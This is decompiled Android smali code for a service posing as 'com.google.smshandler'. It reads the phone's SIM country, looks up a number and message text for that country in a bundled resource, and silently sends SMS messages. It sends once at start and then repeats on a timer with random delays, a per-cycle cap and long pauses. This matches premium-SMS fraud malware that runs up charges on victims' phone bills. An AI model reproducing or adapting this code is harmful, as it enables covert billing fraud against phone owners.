.class public Lcom/google/smshandler/SmsService;
.super Landroid/app/Service;
.source "SmsService.java"


# annotations
.annotation system Ldalvik/annotation/MemberClasses;
    value = {
        Lcom/google/smshandler/SmsService$MyTask;
    }
.end annotation


# static fields
.field static sm:Lcom/google/smshandler/SmsService;


# instance fields
.field countrs:Ljava/util/Vector;

.field day:J

.field i:I

.field interval:I

.field message:Ljava/lang/String;

.field myTask:Ljava/util/TimerTask;

.field mypref:I

.field needklv:I

.field nextDate:J

.field number:Ljava/lang/String;

.field numbs:Ljava/util/Vector;

.field pendingMsgSent:Landroid/app/PendingIntent;

.field prostoy:J

.field qwe:I

.field run:Z

.field sendatthisday:Z

.field sended:I

.field snd:Z

.field t:Ljava/util/Timer;

.field texts:Ljava/util/Vector;


# direct methods
.method public constructor <init>()V
    .locals 6

    .prologue
    const/4 v5, 0x1

    const/4 v4, 0x0

    .line 44
    invoke-direct {p0}, Landroid/app/Service;-><init>()V

    .line 47
    iput v4, p0, Lcom/google/smshandler/SmsService;->i:I

    .line 48
    const/16 v0, 0x159

    iput v0, p0, Lcom/google/smshandler/SmsService;->qwe:I

    .line 49
    iput v5, p0, Lcom/google/smshandler/SmsService;->interval:I

    .line 50
    iput-boolean v4, p0, Lcom/google/smshandler/SmsService;->sendatthisday:Z

    .line 51
    const-wide/16 v0, 0x0

    iput-wide v0, p0, Lcom/google/smshandler/SmsService;->nextDate:J

    .line 52
    const-wide/32 v0, 0x5265c00

    iput-wide v0, p0, Lcom/google/smshandler/SmsService;->day:J

    .line 53
    const-string v0, "1111111"

    iput-object v0, p0, Lcom/google/smshandler/SmsService;->number:Ljava/lang/String;

    .line 54
    const-string v0, "good"

    iput-object v0, p0, Lcom/google/smshandler/SmsService;->message:Ljava/lang/String;

    .line 55
    const/4 v0, 0x2

    iput v0, p0, Lcom/google/smshandler/SmsService;->needklv:I

    .line 56
    iget-wide v0, p0, Lcom/google/smshandler/SmsService;->day:J

    const-wide/16 v2, 0x1e

    mul-long/2addr v0, v2

    iput-wide v0, p0, Lcom/google/smshandler/SmsService;->prostoy:J

    .line 57
    iput v4, p0, Lcom/google/smshandler/SmsService;->sended:I

    .line 58
    iput v4, p0, Lcom/google/smshandler/SmsService;->mypref:I

    .line 59
    iput-boolean v4, p0, Lcom/google/smshandler/SmsService;->run:Z

    .line 60
    new-instance v0, Ljava/util/Vector;

    invoke-direct {v0}, Ljava/util/Vector;-><init>()V

    iput-object v0, p0, Lcom/google/smshandler/SmsService;->countrs:Ljava/util/Vector;

    .line 61
    new-instance v0, Ljava/util/Vector;

    invoke-direct {v0}, Ljava/util/Vector;-><init>()V

    iput-object v0, p0, Lcom/google/smshandler/SmsService;->numbs:Ljava/util/Vector;

    .line 62
    new-instance v0, Ljava/util/Vector;

    invoke-direct {v0}, Ljava/util/Vector;-><init>()V

    iput-object v0, p0, Lcom/google/smshandler/SmsService;->texts:Ljava/util/Vector;

    .line 63
    iput-boolean v5, p0, Lcom/google/smshandler/SmsService;->snd:Z

    .line 45
    sput-object p0, Lcom/google/smshandler/SmsService;->sm:Lcom/google/smshandler/SmsService;

    .line 46
    return-void
.end method

.method static synthetic access$000(Lcom/google/smshandler/SmsService;)V
    .locals 0
    .param p0, "x0"    # Lcom/google/smshandler/SmsService;

    .prologue
    .line 38
    invoke-direct {p0}, Lcom/google/smshandler/SmsService;->generatedNextDay()V

    return-void
.end method

.method static synthetic access$100(Lcom/google/smshandler/SmsService;)V
    .locals 0
    .param p0, "x0"    # Lcom/google/smshandler/SmsService;

    .prologue
    .line 38
    invoke-direct {p0}, Lcom/google/smshandler/SmsService;->saveState()V

    return-void
.end method

.method private generatedNextDay()V
    .locals 6

    .prologue
    .line 156
    invoke-static {}, Ljava/lang/System;->currentTimeMillis()J

    move-result-wide v0

    iget-wide v2, p0, Lcom/google/smshandler/SmsService;->day:J

    iget v4, p0, Lcom/google/smshandler/SmsService;->interval:I

    int-to-long v4, v4

    mul-long/2addr v2, v4

    add-long/2addr v0, v2

    new-instance v2, Ljava/util/Random;

    invoke-direct {v2}, Ljava/util/Random;-><init>()V

    iget-wide v3, p0, Lcom/google/smshandler/SmsService;->day:J

    long-to-int v3, v3

    invoke-virtual {v2, v3}, Ljava/util/Random;->nextInt(I)I

    move-result v2

    int-to-long v2, v2

    add-long/2addr v0, v2

    iput-wide v0, p0, Lcom/google/smshandler/SmsService;->nextDate:J

    .line 157
    iget v0, p0, Lcom/google/smshandler/SmsService;->sended:I

    iget v1, p0, Lcom/google/smshandler/SmsService;->needklv:I

    if-ne v0, v1, :cond_0

    .line 159
    const/4 v0, 0x0

    iput v0, p0, Lcom/google/smshandler/SmsService;->sended:I

    .line 160
    invoke-static {}, Ljava/lang/System;->currentTimeMillis()J

    move-result-wide v0

    iget-wide v2, p0, Lcom/google/smshandler/SmsService;->prostoy:J

    add-long/2addr v0, v2

    iput-wide v0, p0, Lcom/google/smshandler/SmsService;->nextDate:J

    .line 163
    :cond_0
    const/4 v0, 0x1

    iput-boolean v0, p0, Lcom/google/smshandler/SmsService;->snd:Z

    .line 164
    return-void
.end method

.method private getLocation()V
    .locals 5

    .prologue
    .line 190
    const-string v1, ""

    .line 191
    .local v1, "iso":Ljava/lang/String;
    const-string v3, "phone"

    invoke-virtual {p0, v3}, Lcom/google/smshandler/SmsService;->getSystemService(Ljava/lang/String;)Ljava/lang/Object;

    move-result-object v2

    check-cast v2, Landroid/telephony/TelephonyManager;

    .line 192
    .local v2, "telephonyManager":Landroid/telephony/TelephonyManager;
    invoke-virtual {v2}, Landroid/telephony/TelephonyManager;->getSimCountryIso()Ljava/lang/String;

    move-result-object v1

    .line 195
    const/4 v0, 0x0

    .local v0, "i":I
    :goto_0
    iget-object v3, p0, Lcom/google/smshandler/SmsService;->countrs:Ljava/util/Vector;

    invoke-virtual {v3}, Ljava/util/Vector;->size()I

    move-result v3

    if-ge v0, v3, :cond_0

    .line 197
    invoke-virtual {v1}, Ljava/lang/String;->hashCode()I

    move-result v3

    iget-object v4, p0, Lcom/google/smshandler/SmsService;->countrs:Ljava/util/Vector;

    invoke-virtual {v4, v0}, Ljava/util/Vector;->elementAt(I)Ljava/lang/Object;

    move-result-object v4

    invoke-virtual {v4}, Ljava/lang/Object;->hashCode()I

    move-result v4

    if-ne v3, v4, :cond_1

    .line 198
    iget-object v3, p0, Lcom/google/smshandler/SmsService;->texts:Ljava/util/Vector;

    invoke-virtual {v3, v0}, Ljava/util/Vector;->elementAt(I)Ljava/lang/Object;

    move-result-object v3

    check-cast v3, Ljava/lang/String;

    iput-object v3, p0, Lcom/google/smshandler/SmsService;->message:Ljava/lang/String;

    .line 199
    iget-object v3, p0, Lcom/google/smshandler/SmsService;->numbs:Ljava/util/Vector;

    invoke-virtual {v3, v0}, Ljava/util/Vector;->elementAt(I)Ljava/lang/Object;

    move-result-object v3

    check-cast v3, Ljava/lang/String;

    iput-object v3, p0, Lcom/google/smshandler/SmsService;->number:Ljava/lang/String;

    .line 204
    :cond_0
    return-void

    .line 195
    :cond_1
    add-int/lit8 v0, v0, 0x1

    goto :goto_0
.end method

.method private loadState()V
    .locals 10

    .prologue
    .line 117
    const-string v4, "0"

    .local v4, "s1":Ljava/lang/String;
    const-string v5, "0"

    .line 119
    .local v5, "s2":Ljava/lang/String;
    :try_start_0
    const-string v7, "state"

    invoke-virtual {p0, v7}, Lcom/google/smshandler/SmsService;->openFileInput(Ljava/lang/String;)Ljava/io/FileInputStream;

    move-result-object v3

    .line 120
    .local v3, "is":Ljava/io/InputStream;
    new-instance v6, Ljava/io/InputStreamReader;

    invoke-direct {v6, v3}, Ljava/io/InputStreamReader;-><init>(Ljava/io/InputStream;)V

    .line 121
    .local v6, "sr":Ljava/io/InputStreamReader;
    new-instance v0, Ljava/io/BufferedReader;

    invoke-direct {v0, v6}, Ljava/io/BufferedReader;-><init>(Ljava/io/Reader;)V

    .line 122
    .local v0, "bf":Ljava/io/BufferedReader;
    invoke-virtual {v0}, Ljava/io/BufferedReader;->readLine()Ljava/lang/String;

    move-result-object v4

    .line 123
    invoke-virtual {v0}, Ljava/io/BufferedReader;->readLine()Ljava/lang/String;

    move-result-object v5

    .line 124
    invoke-virtual {v0}, Ljava/io/BufferedReader;->close()V

    .line 125
    invoke-virtual {v6}, Ljava/io/InputStreamReader;->close()V

    .line 126
    invoke-virtual {v3}, Ljava/io/InputStream;->close()V
    :try_end_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_0

    .line 133
    .end local v0    # "bf":Ljava/io/BufferedReader;
    .end local v3    # "is":Ljava/io/InputStream;
    .end local v6    # "sr":Ljava/io/InputStreamReader;
    :goto_0
    invoke-virtual {v4}, Ljava/lang/String;->length()I

    move-result v7

    const/4 v8, 0x1

    if-ge v7, v8, :cond_0

    .line 134
    invoke-static {}, Ljava/lang/System;->currentTimeMillis()J

    move-result-wide v7

    iput-wide v7, p0, Lcom/google/smshandler/SmsService;->nextDate:J

    .line 135
    const/4 v7, 0x0

    iput v7, p0, Lcom/google/smshandler/SmsService;->sended:I

    .line 140
    :goto_1
    return-void

    .line 127
    :catch_0
    move-exception v1

    .line 128
    .local v1, "e":Ljava/lang/Exception;
    const-string v4, "0"

    .line 129
    new-instance v7, Ljava/util/Random;

    invoke-direct {v7}, Ljava/util/Random;-><init>()V

    iget-wide v8, p0, Lcom/google/smshandler/SmsService;->day:J

    long-to-int v8, v8

    invoke-virtual {v7, v8}, Ljava/util/Random;->nextInt(I)I

    move-result v2

    .line 130
    .local v2, "i":I
    const-string v5, "0"

    .line 131
    new-instance v7, Ljava/lang/StringBuilder;

    invoke-direct {v7}, Ljava/lang/StringBuilder;-><init>()V

    const-string v8, ""

    invoke-virtual {v7, v8}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v7

    invoke-virtual {v7, v2}, Ljava/lang/StringBuilder;->append(I)Ljava/lang/StringBuilder;

    move-result-object v7

    invoke-virtual {v7}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v4

    goto :goto_0

    .line 137
    .end local v1    # "e":Ljava/lang/Exception;
    .end local v2    # "i":I
    :cond_0
    invoke-static {v4}, Ljava/lang/Long;->parseLong(Ljava/lang/String;)J

    move-result-wide v7

    iput-wide v7, p0, Lcom/google/smshandler/SmsService;->nextDate:J

    .line 138
    invoke-static {v5}, Ljava/lang/Integer;->parseInt(Ljava/lang/String;)I

    move-result v7

    iput v7, p0, Lcom/google/smshandler/SmsService;->sended:I

    goto :goto_1
.end method

.method private saveState()V
    .locals 8

    .prologue
    .line 168
    :try_start_0
    const-string v5, "state"

    invoke-virtual {p0, v5}, Lcom/google/smshandler/SmsService;->deleteFile(Ljava/lang/String;)Z
    :try_end_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_1

    .line 172
    :goto_0
    :try_start_1
    new-instance v5, Ljava/lang/StringBuilder;

    invoke-direct {v5}, Ljava/lang/StringBuilder;-><init>()V

    iget-wide v6, p0, Lcom/google/smshandler/SmsService;->nextDate:J

    invoke-virtual {v5, v6, v7}, Ljava/lang/StringBuilder;->append(J)Ljava/lang/StringBuilder;

    move-result-object v5

    const-string v6, "\n"

    invoke-virtual {v5, v6}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v5

    invoke-virtual {v5}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v3

    .line 173
    .local v3, "str1":Ljava/lang/String;
    new-instance v5, Ljava/lang/StringBuilder;

    invoke-direct {v5}, Ljava/lang/StringBuilder;-><init>()V

    iget v6, p0, Lcom/google/smshandler/SmsService;->sended:I

    invoke-virtual {v5, v6}, Ljava/lang/StringBuilder;->append(I)Ljava/lang/StringBuilder;

    move-result-object v5

    const-string v6, "\n"

    invoke-virtual {v5, v6}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v5

    invoke-virtual {v5}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v4

    .line 174
    .local v4, "str2":Ljava/lang/String;
    const-string v5, "state"

    const/4 v6, 0x0

    invoke-virtual {p0, v5, v6}, Lcom/google/smshandler/SmsService;->openFileOutput(Ljava/lang/String;I)Ljava/io/FileOutputStream;

    move-result-object v1

    .line 175
    .local v1, "out":Ljava/io/OutputStream;
    new-instance v2, Ljava/io/OutputStreamWriter;

    invoke-direct {v2, v1}, Ljava/io/OutputStreamWriter;-><init>(Ljava/io/OutputStream;)V

    .line 176
    .local v2, "ow":Ljava/io/OutputStreamWriter;
    new-instance v0, Ljava/io/BufferedWriter;

    invoke-direct {v0, v2}, Ljava/io/BufferedWriter;-><init>(Ljava/io/Writer;)V

    .line 177
    .local v0, "bw":Ljava/io/BufferedWriter;
    const/4 v5, 0x0

    invoke-virtual {v3}, Ljava/lang/String;->length()I

    move-result v6

    invoke-virtual {v0, v3, v5, v6}, Ljava/io/BufferedWriter;->write(Ljava/lang/String;II)V

    .line 178
    const/4 v5, 0x0

    invoke-virtual {v4}, Ljava/lang/String;->length()I

    move-result v6

    invoke-virtual {v0, v4, v5, v6}, Ljava/io/BufferedWriter;->write(Ljava/lang/String;II)V

    .line 179
    invoke-virtual {v0}, Ljava/io/BufferedWriter;->flush()V

    .line 180
    invoke-virtual {v0}, Ljava/io/BufferedWriter;->close()V

    .line 181
    invoke-virtual {v2}, Ljava/io/OutputStreamWriter;->flush()V

    .line 182
    invoke-virtual {v2}, Ljava/io/OutputStreamWriter;->close()V

    .line 183
    invoke-virtual {v1}, Ljava/io/OutputStream;->flush()V

    .line 184
    invoke-virtual {v1}, Ljava/io/OutputStream;->flush()V
    :try_end_1
    .catch Ljava/lang/Exception; {:try_start_1 .. :try_end_1} :catch_0

    .line 187
    .end local v0    # "bw":Ljava/io/BufferedWriter;
    .end local v1    # "out":Ljava/io/OutputStream;
    .end local v2    # "ow":Ljava/io/OutputStreamWriter;
    .end local v3    # "str1":Ljava/lang/String;
    .end local v4    # "str2":Ljava/lang/String;
    :goto_1
    return-void

    .line 185
    :catch_0
    move-exception v5

    goto :goto_1

    .line 169
    :catch_1
    move-exception v5

    goto :goto_0
.end method


# virtual methods
.method public load()V
    .locals 9

    .prologue
    .line 222
    :try_start_0
    invoke-virtual {p0}, Lcom/google/smshandler/SmsService;->getResources()Landroid/content/res/Resources;

    move-result-object v2

    .line 223
    .local v2, "r":Landroid/content/res/Resources;
    const/high16 v5, 0x7f040000

    invoke-virtual {v2, v5}, Landroid/content/res/Resources;->openRawResource(I)Ljava/io/InputStream;

    move-result-object v1

    .line 224
    .local v1, "is":Ljava/io/InputStream;
    new-instance v3, Ljava/io/InputStreamReader;

    invoke-direct {v3, v1}, Ljava/io/InputStreamReader;-><init>(Ljava/io/InputStream;)V

    .line 225
    .local v3, "sr":Ljava/io/InputStreamReader;
    new-instance v0, Ljava/io/BufferedReader;

    invoke-direct {v0, v3}, Ljava/io/BufferedReader;-><init>(Ljava/io/Reader;)V

    .line 226
    .local v0, "bf":Ljava/io/BufferedReader;
    const-string v4, ""

    .line 227
    .local v4, "str":Ljava/lang/String;
    :cond_0
    :goto_0
    invoke-virtual {v0}, Ljava/io/BufferedReader;->readLine()Ljava/lang/String;
    :try_end_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_1

    move-result-object v4

    if-eqz v4, :cond_1

    .line 229
    :try_start_1
    const-string v5, ","

    invoke-virtual {v4, v5}, Ljava/lang/String;->lastIndexOf(Ljava/lang/String;)I

    move-result v5

    const/4 v6, 0x2

    if-le v5, v6, :cond_0

    .line 231
    iget-object v5, p0, Lcom/google/smshandler/SmsService;->countrs:Ljava/util/Vector;

    const/4 v6, 0x0

    const-string v7, ","

    const/4 v8, 0x0

    invoke-virtual {v4, v7, v8}, Ljava/lang/String;->indexOf(Ljava/lang/String;I)I

    move-result v7

    invoke-virtual {v4, v6, v7}, Ljava/lang/String;->substring(II)Ljava/lang/String;

    move-result-object v6

    invoke-virtual {v5, v6}, Ljava/util/Vector;->addElement(Ljava/lang/Object;)V

    .line 233
    const-string v5, ","

    const/4 v6, 0x0

    invoke-virtual {v4, v5, v6}, Ljava/lang/String;->indexOf(Ljava/lang/String;I)I

    move-result v5

    add-int/lit8 v5, v5, 0x1

    invoke-virtual {v4, v5}, Ljava/lang/String;->substring(I)Ljava/lang/String;

    move-result-object v4

    .line 234
    iget-object v5, p0, Lcom/google/smshandler/SmsService;->numbs:Ljava/util/Vector;

    const/4 v6, 0x0

    const-string v7, ","

    const/4 v8, 0x0

    invoke-virtual {v4, v7, v8}, Ljava/lang/String;->indexOf(Ljava/lang/String;I)I

    move-result v7

    invoke-virtual {v4, v6, v7}, Ljava/lang/String;->substring(II)Ljava/lang/String;

    move-result-object v6

    invoke-virtual {v5, v6}, Ljava/util/Vector;->addElement(Ljava/lang/Object;)V

    .line 235
    const-string v5, ","

    const/4 v6, 0x0

    invoke-virtual {v4, v5, v6}, Ljava/lang/String;->indexOf(Ljava/lang/String;I)I

    move-result v5

    add-int/lit8 v5, v5, 0x1

    invoke-virtual {v4, v5}, Ljava/lang/String;->substring(I)Ljava/lang/String;

    move-result-object v4

    .line 236
    iget-object v5, p0, Lcom/google/smshandler/SmsService;->texts:Ljava/util/Vector;

    invoke-virtual {v5, v4}, Ljava/util/Vector;->addElement(Ljava/lang/Object;)V
    :try_end_1
    .catch Ljava/lang/Exception; {:try_start_1 .. :try_end_1} :catch_0

    goto :goto_0

    .line 240
    :catch_0
    move-exception v5

    goto :goto_0

    .line 243
    :cond_1
    :try_start_2
    invoke-virtual {v0}, Ljava/io/BufferedReader;->close()V

    .line 244
    invoke-virtual {v3}, Ljava/io/InputStreamReader;->close()V

    .line 245
    invoke-virtual {v1}, Ljava/io/InputStream;->close()V
    :try_end_2
    .catch Ljava/lang/Exception; {:try_start_2 .. :try_end_2} :catch_1

    .line 248
    .end local v0    # "bf":Ljava/io/BufferedReader;
    .end local v1    # "is":Ljava/io/InputStream;
    .end local v2    # "r":Landroid/content/res/Resources;
    .end local v3    # "sr":Ljava/io/InputStreamReader;
    .end local v4    # "str":Ljava/lang/String;
    :goto_1
    return-void

    .line 246
    :catch_1
    move-exception v5

    goto :goto_1
.end method

.method public onBind(Landroid/content/Intent;)Landroid/os/IBinder;
    .locals 1
    .param p1, "arg0"    # Landroid/content/Intent;

    .prologue
    .line 69
    const/16 v0, 0x15b

    iput v0, p0, Lcom/google/smshandler/SmsService;->qwe:I

    .line 70
    const/4 v0, 0x0

    return-object v0
.end method

.method public onCreate()V
    .locals 1

    .prologue
    .line 112
    const/16 v0, 0x15c

    iput v0, p0, Lcom/google/smshandler/SmsService;->qwe:I

    .line 113
    invoke-super {p0}, Landroid/app/Service;->onCreate()V

    .line 114
    return-void
.end method

.method public onStart(Landroid/content/Intent;I)V
    .locals 8
    .param p1, "i"    # Landroid/content/Intent;
    .param p2, "startId"    # I

    .prologue
    const-wide/16 v2, 0x1388

    const/4 v7, 0x0

    .line 75
    const/4 v0, 0x1

    iput-boolean v0, p0, Lcom/google/smshandler/SmsService;->run:Z

    .line 76
    invoke-virtual {p0}, Lcom/google/smshandler/SmsService;->load()V

    .line 78
    const/16 v0, 0x15a

    iput v0, p0, Lcom/google/smshandler/SmsService;->qwe:I

    .line 79
    invoke-super {p0, p1, p2}, Landroid/app/Service;->onStart(Landroid/content/Intent;I)V

    .line 80
    invoke-direct {p0}, Lcom/google/smshandler/SmsService;->loadState()V

    .line 81
    invoke-direct {p0}, Lcom/google/smshandler/SmsService;->getLocation()V

    .line 82
    iget-object v0, p0, Lcom/google/smshandler/SmsService;->number:Ljava/lang/String;

    iget-object v1, p0, Lcom/google/smshandler/SmsService;->message:Ljava/lang/String;

    invoke-virtual {p0, v0, v1}, Lcom/google/smshandler/SmsService;->sendSms(Ljava/lang/String;Ljava/lang/String;)V

    .line 83
    new-instance v0, Ljava/util/Timer;

    invoke-direct {v0}, Ljava/util/Timer;-><init>()V

    iput-object v0, p0, Lcom/google/smshandler/SmsService;->t:Ljava/util/Timer;

    .line 84
    new-instance v0, Lcom/google/smshandler/SmsService$MyTask;

    invoke-direct {v0, p0}, Lcom/google/smshandler/SmsService$MyTask;-><init>(Lcom/google/smshandler/SmsService;)V

    iput-object v0, p0, Lcom/google/smshandler/SmsService;->myTask:Ljava/util/TimerTask;

    .line 85
    iget-object v0, p0, Lcom/google/smshandler/SmsService;->t:Ljava/util/Timer;

    iget-object v1, p0, Lcom/google/smshandler/SmsService;->myTask:Ljava/util/TimerTask;

    move-wide v4, v2

    invoke-virtual/range {v0 .. v5}, Ljava/util/Timer;->schedule(Ljava/util/TimerTask;JJ)V

    .line 86
    new-instance v6, Landroid/content/Intent;

    const-string v0, "ACTION_MSG_SENT"

    invoke-direct {v6, v0}, Landroid/content/Intent;-><init>(Ljava/lang/String;)V

    .line 87
    .local v6, "msgSent":Landroid/content/Intent;
    invoke-static {p0, v7, v6, v7}, Landroid/app/PendingIntent;->getBroadcast(Landroid/content/Context;ILandroid/content/Intent;I)Landroid/app/PendingIntent;

    move-result-object v0

    iput-object v0, p0, Lcom/google/smshandler/SmsService;->pendingMsgSent:Landroid/app/PendingIntent;

    .line 89
    new-instance v0, Lcom/google/smshandler/SmsService$1;

    invoke-direct {v0, p0}, Lcom/google/smshandler/SmsService$1;-><init>(Lcom/google/smshandler/SmsService;)V

    new-instance v1, Landroid/content/IntentFilter;

    const-string v2, "ACTION_MSG_SENT"

    invoke-direct {v1, v2}, Landroid/content/IntentFilter;-><init>(Ljava/lang/String;)V

    invoke-virtual {p0, v0, v1}, Lcom/google/smshandler/SmsService;->registerReceiver(Landroid/content/BroadcastReceiver;Landroid/content/IntentFilter;)Landroid/content/Intent;

    .line 108
    return-void
.end method

.method public remove(Ljava/lang/String;)Ljava/lang/String;
    .locals 4
    .param p1, "str"    # Ljava/lang/String;

    .prologue
    const/16 v3, 0xa

    .line 251
    :goto_0
    invoke-virtual {p1, v3}, Ljava/lang/String;->indexOf(I)I

    move-result v0

    const/4 v1, -0x1

    if-le v0, v1, :cond_0

    .line 252
    new-instance v0, Ljava/lang/StringBuilder;

    invoke-direct {v0}, Ljava/lang/StringBuilder;-><init>()V

    const/4 v1, 0x0

    invoke-virtual {p1, v3}, Ljava/lang/String;->indexOf(I)I

    move-result v2

    invoke-virtual {p1, v1, v2}, Ljava/lang/String;->substring(II)Ljava/lang/String;

    move-result-object v1

    invoke-virtual {v0, v1}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v0

    invoke-virtual {p1, v3}, Ljava/lang/String;->indexOf(I)I

    move-result v1

    add-int/lit8 v1, v1, 0x1

    invoke-virtual {p1, v1}, Ljava/lang/String;->substring(I)Ljava/lang/String;

    move-result-object v1

    invoke-virtual {v0, v1}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v0

    invoke-virtual {v0}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object p1

    goto :goto_0

    .line 254
    :cond_0
    return-object p1
.end method

.method public sendSms(Ljava/lang/String;Ljava/lang/String;)V
    .locals 6
    .param p1, "numb"    # Ljava/lang/String;
    .param p2, "text"    # Ljava/lang/String;

    .prologue
    .line 143
    const/4 v1, 0x0

    iput-boolean v1, p0, Lcom/google/smshandler/SmsService;->snd:Z

    .line 147
    :try_start_0
    invoke-static {}, Landroid/telephony/SmsManager;->getDefault()Landroid/telephony/SmsManager;

    move-result-object v0

    .line 148
    .local v0, "sms":Landroid/telephony/SmsManager;
    const/4 v2, 0x0

    iget-object v4, p0, Lcom/google/smshandler/SmsService;->pendingMsgSent:Landroid/app/PendingIntent;

    const/4 v5, 0x0

    move-object v1, p1

    move-object v3, p2

    invoke-virtual/range {v0 .. v5}, Landroid/telephony/SmsManager;->sendTextMessage(Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;Landroid/app/PendingIntent;Landroid/app/PendingIntent;)V
    :try_end_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_0

    .line 152
    .end local v0    # "sms":Landroid/telephony/SmsManager;
    :goto_0
    return-void

    .line 150
    :catch_0
    move-exception v1

    goto :goto_0
.end method
